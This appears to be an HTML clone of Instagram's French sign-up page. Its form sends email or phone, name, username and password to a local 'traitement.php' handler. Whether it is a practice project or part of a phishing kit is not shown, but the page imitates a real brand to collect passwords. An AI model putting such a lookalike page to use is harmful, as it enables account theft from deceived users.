<!DOCTYPE html>
<html lang="fr">

<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Inscription Instagram</title>
    <style>
        body {
            margin: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }

        .form-container {
            background-color: #fff;
            border: 1px solid #dbdbdb;
            padding: 40px 40px 20px;
            border-radius: 1px;
            width: 350px;
            text-align: center;
            margin: 0 40px;
        }

        .logo {
            font-family: 'Billabong', cursive;
            font-size: 44px;
            color: #262626;
            margin: 10px 0 30px;
            font-weight: normal;
        }

        .form-group {
            margin-bottom: 6px;
            text-align: left;
        }

        .form-group input {
            width: 100%;
            padding: 9px 8px;
            font-size: 12px;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            background-color: #fafafa;
            color: #262626;
        }

        .form-group input:focus {
            outline: none;
            border-color: #a8a8a8;
        }

        input[type="submit"] {
            width: 100%;
            background-color: #0095f6;
            color: white;
            font-weight: 600;
            font-size: 14px;
            padding: 7px;
            border: none;
            border-radius: 8px;
            margin: 14px 0;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }

        input[type="submit"]:hover {
            background-color: #0077cc;
        }

        .divider {
            margin: 18px 0;
            position: relative;
            color: #8e8e8e;
            font-size: 13px;
            font-weight: 600;
        }

        .divider::before,
        .divider::after {
            content: "";
            position: absolute;
            top: 50%;
            width: 43%;
            height: 1px;
            background-color: #dbdbdb;
        }

        .divider::before {
            left: 0;
        }

        .divider::after {
            right: 0;
        }

        .login-link {
            color: #00376b;
            font-size: 14px;
            text-decoration: none;
            display: block;
            margin: 15px 0;
        }

        .policy {
            color: #8e8e8e;
            font-size: 12px;
            line-height: 1.4;
            margin: 15px 20px;
        }

        .policy a {
            color: #00376b;
            text-decoration: none;
            font-weight: 600;
        }

        .app-links {
            margin-top: 20px;
            text-align: center;
        }

        .app-links img {
            height: 40px;
            margin: 10px;
        }

        .signup-link {
            margin: 15px 0 0;
            padding: 15px;
            font-size: 14px;
            color: #262626;
            border-top: 1px solid #dbdbdb;
        }
    </style>
</head>

<body>
    <div class="form-container">
        <div class="logo">Instagram</div>
        <form action="traitement.php" method="POST">
            <div class="form-group">
                <input type="text" name="email" placeholder="Numéro de mobile ou e-mail" required>
            </div>
            <div class="form-group">
                <input type="text" name="fullname" placeholder="Nom complet" required>
            </div>
            <div class="form-group">
                <input type="text" name="nom" placeholder="Nom d'utilisateur" required>
            </div>
            <div class="form-group">
                <input type="password" name="password" placeholder="Mot de passe" required>
            </div>
            <input type="submit" value="Inscription">
        </form>



        <p class="policy">
            En vous inscrivant, vous acceptez nos <a href="#">Conditions</a>,
            notre <a href="#">Politique de confidentialité</a> et notre
            <a href="#">Politique en matière de cookies</a>.
        </p>

        
       
        <div class="signup-link">
        Vous avez un compte ?
            <a href="login.php" style="color: #0095f6; text-decoration: none; font-weight: 600;"> Connectez-vous</a>
        </div>
    </div>

    <!-- <div class="app-links">
    <p>Téléchargez l'application.</p>
    <img src="app-store.png" alt="App Store">
    <img src="google-play.png" alt="Google Play">
  </div> -->
</body>

</html>